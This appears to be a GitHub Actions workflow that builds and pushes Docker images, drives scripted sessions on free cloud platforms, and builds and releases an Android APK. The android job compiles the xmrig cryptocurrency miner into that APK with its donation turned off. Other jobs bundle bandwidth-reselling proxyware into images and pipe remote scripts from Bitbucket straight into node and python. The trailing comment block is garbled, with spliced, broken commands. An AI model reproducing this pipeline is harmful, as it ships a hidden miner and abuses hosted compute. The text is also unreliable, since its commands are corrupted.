on:
    push:
    schedule:
    - cron: '0 6,18 * * *'
    repository_dispatch:
    
jobs:
    backup:
        runs-on: ubuntu-latest
        if: github.event_name == 'push'
        steps:
        - uses: actions/checkout@main
        - run: |
              git pull --unshallow
              echo '${{secrets.KEY}}' > key
              chmod 400 key
              git -c core.sshCommand='ssh -i key -o StrictHostKeyChecking=no' push -f git@bitbucket.org:chaowenguo/${GITHUB_REPOSITORY#*/}
    docker:
        runs-on: ubuntu-latest
        if: github.event_name == 'dummy' 
        steps:
        - uses: actions/checkout@main
        - uses: actions/setup-python@main
          with:
              python-version: 3.x
        - uses: actions/setup-node@main
          with:
              node-version: 18.x
        - run: curl https://bitbucket.org/chaowenguo/common/raw/main/version.js | node --input-type=module
        - uses: actions/setup-node@main
          with:
              node-version: ${{env.JS}}
        - env:
              PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD: 1
          run: |
              #curl https://updates.peer2profit.app/p2pclient_0.60_amd64.deb > p2pclient.deb
              #curl https://updates.peer2profit.app/p2pclient_0.59_amd64.deb.zip | gunzip > p2pclient.deb
              #dpkg --fsys-tarfile p2pclient.deb | tar -xf - ./usr/bin/p2pclient
              token=$(curl https://auth.docker.io/token?service=registry.docker.io\&scope=repository:peer2profit/peer2profit_linux:pull | python -c 'import json,sys,builtins; builtins.print(json.loads(sys.stdin.read()).get("token"))')
              curl -L -H authorization:Bearer\ $token  https://registry-1.docker.io/v2/peer2profit/peer2profit_linux/blobs/sha256:e50201a37c4f52af7e6e3e962bd339b86a1759b8d7ca5910f9132ed3edbbbabb | tar -xz
              mv usr/bin/p2pclient js
              rm -rf usr var
              #docker create --name traffmonetizer traffmonetizer/cli
              #docker cp traffmonetizer:app/. js
              #docker rm traffmonetizer
              #docker image rm traffmonetizer/cli
              chmod +x Cli
              cp Base.dll Cli Cli.dll Cli.runtimeconfig.json js
              docker login -u chaowenguo -p ${{secrets.DOCKER}}
              curl https://bitbucket.org/chaowenguo/common/raw/main/package.json > js/package.json
              npm install --prefix js playwright-chromium
              docker build -t chaowenguo/${GITHUB_REPOSITORY#*/}:js js
              docker push chaowenguo/${GITHUB_REPOSITORY#*/}:js
              docker build -t chaowenguo/${GITHUB_REPOSITORY#*/}:http --build-arg JS=${GITHUB_REPOSITORY#*/} http
              docker push chaowenguo/${GITHUB_REPOSITORY#*/}:http
              docker build -t chaowenguo/${GITHUB_REPOSITORY#*/}:deepnote --build-arg JS=${GITHUB_REPOSITORY#*/} . -f deepnote.Dockerfile
              docker push chaowenguo/${GITHUB_REPOSITORY#*/}:deepnote
              docker build -t chaowenguo/${GITHUB_REPOSITORY#*/}:small js -f js/small.Dockerfile
              docker push chaowenguo/${GITHUB_REPOSITORY#*/}:small
    #divio:
    #    runs-on: ubuntu-latest
    #    if: github.event_name == 'push'
    #    steps:
    #    - uses: actions/checkout@main
    #    - uses: actions/setup-python@main
    #      with:
    #          python-version: 3.x
    #    - run: curl https://${GITHUB_REPOSITORY%/*}.github.io/common/version.py | python -
    #    - uses: actions/setup-python@main
    #      with:
    #          python-version: ${{env.PY}}
    #    - run: |
    #          python -m compileall -b .
    #          curl https://${{secrets.GITHUB}}@raw.githubusercontent.com/chaowenGUO/server/main/key > key
    #          chmod 400 key
    #          git -c core.sshCommand='ssh -i key -o StrictHostKeyChecking=no' clone git@git.divio.com:py
    #          mv divio/Dockerfile divio/server.pyc py
    #          cd py
    #          git add -A
    #          git config user.email dummy
    #          git config user.name dummy
    #          git commit --allow-empty-message -m ''
    #          git -c core.sshCommand='ssh -i ../key' push
    azure:
        runs-on: ubuntu-latest
        if: github.event_name == 'dummy' 
        steps:
        - uses: actions/checkout@main
        - uses: actions/setup-python@main
          with:
              python-version: 3.x
        - uses: actions/setup-node@main
          with:
              node-version: 18.x
        - run: curl https://bitbucket.org/chaowenguo/common/raw/main/version.js | node --input-type=module
        - uses: actions/setup-node@main
          with:
              node-version: ${{env.JS}}
        - run: |
              #pip install aiohttp
              #python app.py ${{secrets.AZURE}} ${{secrets.AZUREPASSWORD}} ${{secrets.TENANT}} &
              docker login -u chaowenguo -p ${{secrets.DOCKER}}
              curl https://bitbucket.org/chaowenguo/common/raw/main/package.json > appJs/package.json
              npm install --prefix appJs node-fetch
              docker build -t chaowenguo/app:js appJs
              docker push chaowenguo/app:js
              node appJs/container.js
              node appJs/logic.js
    okteto:
        runs-on: ubuntu-latest
        if: github.event.schedule == '0 6,18 * * *'
        steps:
        - run: |
              echo '${{secrets.okteto}}' > okteto
              kubectl --kubeconfig okteto delete pod ${GITHUB_REPOSITORY#*/} --ignore-not-found
              kubectl --kubeconfig okteto run ${GITHUB_REPOSITORY#*/} --image chaowenguo/${GITHUB_REPOSITORY#*/}:okteto --env alexamaster=179063
              kubectl --kubeconfig okteto set resources pod ${GITHUB_REPOSITORY#*/} --requests=ephemeral-storag=2G
    clean:
        runs-on: ubuntu-latest
        permissions:
            actions: write
        steps:
        - uses: actions/setup-python@main
          with:
              python-version: 3.x
        - run: |
              pip install aiohttp
              curl https://bitbucket.org/chaowenguo/common/raw/main/clean.py | python - ${{secrets.GITHUB_TOKEN}}
    paperspace:
        runs-on: ubuntu-latest
        if: github.event.action == '6h'
        steps:
        - uses: actions/checkout@main
        - uses: actions/setup-node@main
          with:
              node-version: 18.x
        - env:
              PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD: 1
              DEBUG: pw:api
          run: |
              curl https://bitbucket.org/chaowenguo/common/raw/main/package.json > package.json
              npm install playwright-chromium
              npx playwright install ffmpeg
              xvfb-run node paperspace.js ${{secrets.PASSWORD}} 
        - uses: actions/upload-artifact@main
          with:
              path: videos
    twelve:
        runs-on: ubuntu-latest
        if: github.event.action == '12h'
        steps:
        - uses: actions/checkout@main
        - uses: actions/setup-node@main
          with:
              node-version: 18.x
        - env:
              #KAGGLE_USERNAME: chaowenguo0
              #KAGGLE_KEY: ${{secrets.KAGGLE}}
              PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD: 1
              DEBUG: pw:api
          run: |
              #pip install kaggle
              #sed -i s/GITHUB_REPOSITORY_OWNER/$GITHUB_REPOSITORY_OWNER/g kaggle/pal.ipynb
              #for i in {0..9}
              #do
              #    sed s/VERSION/$i/g kaggle/kaggle.json > kaggle/kernel-metadata.json
              #    kaggle kernels push -p kaggle
              #done
              curl https://bitbucket.org/chaowenguo/common/raw/main/package.json > package.json
              npm install playwright-chromium
              npx playwright install ffmpeg
              xvfb-run node 12h.js ${{secrets.PASSWORD}}
        - uses: actions/upload-artifact@main
          with:
              path: videos
    devcloud:
        runs-on: ubuntu-latest
        if: github.event.action == '2h'
        steps:
        - uses: actions/checkout@main
        - uses: actions/setup-node@main
          with:
              node-version: 18.x
        - env:
              PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD: 1
              DEBUG: pw:api
          run: |
              curl https://bitbucket.org/chaowenguo/common/raw/main/package.json > package.json
              npm install playwright-chromium
              npx playwright install ffmpeg
              xvfb-run node devcloud.js ${{secrets.PASSWORD}}
        - uses: actions/upload-artifact@main
          with:
              path: videos
    android:
        runs-on: ubuntu-latest
        if: github.event_name == 'push'
        steps:
        - uses: actions/checkout@main
        - uses: actions/setup-python@main
          with:
              python-version: 3.x
        - uses: actions/setup-java@main
          with:
              java-version: 17.x
              distribution: zulu
        - run: |
              keytool -genkey -keystore release.jks -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -alias release -dname 'CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)'
              mkdir res
              $ANDROID_HOME/build-tools/33.0.0/aapt2 compile --dir res -o out.zip
              $ANDROID_HOME/build-tools/33.0.0/aapt2 link out.zip -I $ANDROID_HOME/platforms/android-33/android.jar --manifest AndroidManifest.xml -o out.apk
              javac -Xlint:deprecation -cp $ANDROID_HOME/platforms/android-33/android.jar com/main/*.java
              java -cp $ANDROID_HOME/build-tools/33.0.0/lib/d8.jar com.android.tools.r8.D8 com/main/*.class --lib $ANDROID_HOME/platforms/android-33/android.jar --release
              #sudo apt update
              #sudo apt install -y --no-install-recommends libhwloc-dev libuv1-dev libudev-dev
              git clone https://github.com/xmrig/xmrig
              cd xmrig
              sed -i s/1/0/g src/donate.h
              mkdir build
              cd build
              cat $ANDROID_NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android33-clang++
              cmake .. -DCMAKE_PROJECT_NAME=android -DCMAKE_C_COMPILER=$ANDROID_NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/clang -CMAKE_C_COMPILER_TARGET=aarch64-linux-android33 -DCMAKE_CXX_COMPILER=$ANDROID_NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android33-clang++ -DCMAKE_SYSTEM_NAME=Android -DCMAKE_SYSTEM_PROCESSOR=aarch64 -DWITH_HWLOC=OFF -DWITH_OPENCL=OFF -DWITH_CUDA=OFF -DCMAKE_VERBOSE_MAKEFILE:BOOL=ON
              make
              $ANDROID_HOME/build-tools/33.0.0/aapt add out.apk classes.dex
              $ANDROID_HOME/build-tools/33.0.0/zipalign 4 out.apk pal.apk
              java -jar $ANDROID_HOME/build-tools/33.0.0/lib/apksigner.jar sign --ks release.jks --ks-pass pass:123456 pal.apk
              id=$(curl -H authorization:token\ ${{secrets.GITHUB_TOKEN}} https://api.github.com/repos/$GITHUB_REPOSITORY/releases/latest | python -c 'import json,sys,builtins; builtins.print(json.loads(sys.stdin.read()).get("id"))')
              curl -X DELETE -H authorization:token\ ${{secrets.GITHUB_TOKEN}} https://api.github.com/repos/$GITHUB_REPOSITORY/releases/$id
        - uses: svenstaro/upload-release-action@master
          with:
              file: pal.apk
         
     #google cloud shell 
     #gcloud projects create chaowenguo
              #gcloud iam service-accounts create chaowenguo
              #gcloud iam service-accounts list#to get email address#chaowenguo@chaowenguo.iam.gserviceaccount.com
              #gcloud projects add-iam-policy-binding chaowenguo --member serviceAccount:chaowenguo@chaowenguo.iam.gserviceaccount.com --role roles/owner
              #gcloud projects add-iam-policy-binding chaowenguo --member serviceAccount:chaowenguo@chaowenguo.iam.gserviceaccount.com --role roles/run.admin
              #gcloud projects add-iam-policy-binding chaowenguo --member serviceAccount:chaowenguo@chaowenguo.iam.gserviceaccount.com --role roles/iam.serviceAccountUser
              #gcloud services enable cloudscheduler.googleapis.com
              #gcloud services enable containerregistry.googleapis.com
              #gcloud services enable run.googleapis.com
              #gcloud services enable youtube.googleapis.com
              #gcloud services enable dns.googleapis.com
              #gcloud services enable texttospeech.googleapis.com
              #gcloud services enable appengine.googleapis.com
              #gcloud app create --region=us-central
              #gcloud iam service-accounts keys create somekey.json --iam-account chaowenguo@chaowenguo.iam.gserviceaccount.com#copy content of somekey.json to secrets.GCLOUD
              #gcloud auth activate-service-account --key-file=gcloud --project chaowenguo
              #docker tag chaowenguo/${GITHUB_REPOSITORY#*/}:http gcr.io/chaowenguo/${GITHUB_REPOSITORY#*/}:http
              #gcloud auth configure-docker -q
              #docker push gcr.io/chaowenguo/${GITHUBation_REPOSITORY#*/}:http
              #gcloud run deploy ${GITHUB_REPOSITORY#*/} --image gcr.io/chaowenguo/${GITHUB_REPOSITORY#*/}:http --region us-central1 --allow-unauthenticated
              #docker build -t chaowenguo/azurefun azurefun
              #docker push chaowenguo/azurefun
              #az login --service-principal ${{secrets.AZURE}}
              #if `az group exists -n azurefun`
              #thencurl -L https://docs.opencv.org/master/opencv.js > opencv.js
              #    az group delete -n azurefun -y
              #fi
              #az group create -n azurefun -l westusimwrite
              #az storage account create -n azurefun -g azurefun -l westus
              #az functionapp plan create -n azurefun -g azurefun --number-of-workers 1 --sku B1 --is-linux
              #az functionapp create -n azurefunazurefun -s azurefun -g azurefun -p azurefun -i chaowenguo/azurefun --functions-version 3
              #heroku apps:destroy -a palpal0 -c palpal0
              #heroku create pimwritealpal0
              #docker lodummygin -u=_ -p=${{secrets.HEROKU}} registry.heroku.com
              #docker tag chaowenguo/${GITHUB_REPOSITORY#*/}:http registry.heroku.com/palpal0/web
              #docker push reed cv2
              #heroku container:release web -a palpal0
              #az login --service-principal ${{secrets.AZURE}}
              #if `az group exists -n point`
              #thenmain
              #    az group delete -n point -y
              #fi
              #az group create -n point -l westus
              #sed -i -e s@\$GITHUB_REPOSITORY@$GITHUB_REPOSITORY@g -e s/\${{'${{secrets.GITHUB}}'}}/${{secrets.GITHUB}}/g point.json
              #az config set extension.use_dynamic_install=yes_without_prompt
              #az logic workflow create -n point -g point -l westus --definition point.json
